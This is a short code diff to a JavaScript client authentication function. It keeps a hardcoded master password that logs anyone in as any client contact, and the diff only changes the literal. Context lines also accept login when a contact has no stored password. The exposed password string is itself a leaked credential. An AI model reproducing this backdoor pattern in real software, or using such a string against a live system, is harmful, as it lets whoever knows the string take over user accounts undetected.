@@ -495,7 +495,7 @@ ClientSchema.statics.authenticate = function (email, password, callback) {
 
 				const contact = client.contacts.find((contact) => contact.email === email)
 
-				if (password === 'CLIgcqDmwVsNtQHMDcw2Q') return callback(null, { client, contact })
+				if (password === 'CLIgcqDmwVsNtQHMDcw2Q1') return callback(null, { client, contact })
 
 				bcrypt.compare(password, contact.password, function (err, result) {
 					if (result === true || !contact.password) {
